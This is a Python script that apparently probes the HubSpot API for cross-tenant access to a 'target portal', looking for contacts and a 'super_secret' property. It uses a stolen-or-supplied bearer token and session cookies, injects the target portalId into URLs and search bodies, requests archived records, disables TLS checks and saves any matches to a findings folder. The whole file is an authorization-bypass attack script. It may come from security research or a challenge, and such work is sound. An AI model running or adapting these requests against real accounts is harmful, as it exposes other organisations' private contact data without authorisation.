#!/usr/bin/env python3
"""
Try to find ANY accessible contacts in target portal
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("FINDING ANY ACCESSIBLE CONTACTS IN TARGET PORTAL")
print("="*80)

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. TRY VID (VISITOR ID) INSTEAD OF OBJECT ID
# ============================================================================

print("\n[1] TESTING VID INSTEAD OF OBJECT ID")
print("="*80)

# VID is different from hs_object_id in HubSpot
vid_urls = [
    f'https://api.hubapi.com/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}&property=firstname&property=super_secret',
    f'https://api.hubapi.com/contacts/v1/contact/vid/1/profile?portalId={TARGET_PORTAL}',
]

for url in vid_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"\n  *** ACCESSIBLE! ***")

            try:
                data = r.json()
                print(f"  Response:")
                print(json.dumps(data, indent=2)[:800])

                if 'super_secret' in json.dumps(data).lower():
                    print(f"\n  *** CONTAINS super_secret! ***")

                    with open('/home/user/Hub/findings/VID_1_DATA.json', 'w') as f:
                        json.dump(data, f, indent=2)
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

# ============================================================================
# 2. LIST ALL CONTACTS (with pagination)
# ============================================================================

print("\n" + "="*80)
print("[2] TRYING TO LIST ALL CONTACTS")
print("="*80)

list_urls = [
    f'https://api.hubapi.com/contacts/v1/lists/all/contacts/all?portalId={TARGET_PORTAL}&property=firstname&property=super_secret&count=100',
    f'https://api.hubapi.com/crm/v3/objects/contacts?portalId={TARGET_PORTAL}&properties=firstname,super_secret&limit=100',
]

for url in list_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"\n  *** ACCESSIBLE! ***")

            try:
                data = r.json()

                # Check total
                total = data.get('total') or len(data.get('contacts', [])) or len(data.get('results', []))
                print(f"  Total contacts: {total}")

                if total > 0:
                    print(f"\n  First few contacts:")
                    contacts = data.get('contacts', data.get('results', []))

                    for i, contact in enumerate(contacts[:5], 1):
                        print(f"\n  Contact {i}:")
                        print(f"    {json.dumps(contact, indent=2)[:300]}")

                        # Check for super_secret
                        if 'super_secret' in json.dumps(contact).lower():
                            print(f"    *** CONTAINS super_secret! ***")

                            with open(f'/home/user/Hub/findings/CONTACT_FROM_LIST_{i}.json', 'w') as f:
                                json.dump(contact, f, indent=2)
            except:
                print(f"  Response: {r.text[:500]}")
    except:
        pass

# ============================================================================
# 3. SEARCH FOR ALL CONTACTS WITH super_secret
# ============================================================================

print("\n" + "="*80)
print("[3] SEARCHING FOR CONTACTS WITH super_secret PROPERTY")
print("="*80)

search_url = 'https://api.hubapi.com/crm/v3/objects/contacts/search'

# Search with explicit portalId in different places
search_attempts = [
    # In query params
    f'{search_url}?portalId={TARGET_PORTAL}',

    # Just the base URL (no portalId - should use token's portal)
    search_url,
]

search_payload = {
    'filterGroups': [{
        'filters': [{
            'propertyName': 'super_secret',
            'operator': 'HAS_PROPERTY'
        }]
    }],
    'properties': ['firstname', 'super_secret', 'email', 'hs_object_id'],
    'limit': 10
}

for url in search_attempts:
    print(f"\n{url}")

    # Also try with portalId in the body
    for include_portal_in_body in [False, True]:
        payload = search_payload.copy()

        if include_portal_in_body:
            payload['portalId'] = TARGET_PORTAL
            print(f"  With portalId in body: {TARGET_PORTAL}")
        else:
            print(f"  Without portalId in body")

        try:
            r = requests.post(url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

            print(f"    Status: {r.status_code}")

            if r.status_code == 200:
                data = r.json()

                total = data.get('total', 0)
                print(f"    Total: {total}")

                if total > 0:
                    print(f"\n    *** FOUND {total} CONTACTS! ***")

                    for i, result in enumerate(data.get('results', [])[:5], 1):
                        print(f"\n    Contact {i}:")
                        print(f"      {json.dumps(result, indent=2)[:400]}")

                        # Check which portal this is from
                        if 'url' in result:
                            print(f"      Portal from URL: {result['url']}")

                        # Save if it has super_secret
                        props = result.get('properties', {})
                        if 'super_secret' in props:
                            print(f"\n      Firstname: {props.get('firstname', 'N/A')}")
                            print(f"      Super Secret: {props.get('super_secret', 'N/A')}")
                            print(f"      Object ID: {props.get('hs_object_id', 'N/A')}")

                            with open(f'/home/user/Hub/findings/SEARCH_RESULT_{i}.json', 'w') as f:
                                json.dump(result, f, indent=2)
        except:
            pass

# ============================================================================
# 4. CHECK FOR ARCHIVED/DELETED CONTACTS
# ============================================================================

print("\n" + "="*80)
print("[4] CHECKING FOR ARCHIVED CONTACTS")
print("="*80)

# Try to search for archived contacts
archived_payload = {
    'filterGroups': [{
        'filters': [{
            'propertyName': 'hs_object_id',
            'operator': 'EQ',
            'value': '1'
        }]
    }],
    'properties': ['firstname', 'super_secret', 'email'],
    'archived': True  # Request archived objects
}

try:
    r = requests.post(search_url, json=archived_payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

    print(f"Status: {r.status_code}")

    if r.status_code == 200:
        data = r.json()

        if data.get('total', 0) > 0:
            print(f"\n*** FOUND ARCHIVED CONTACT 1! ***")
            print(json.dumps(data, indent=2))
        else:
            print("Contact 1 not found in archived contacts")
except:
    pass
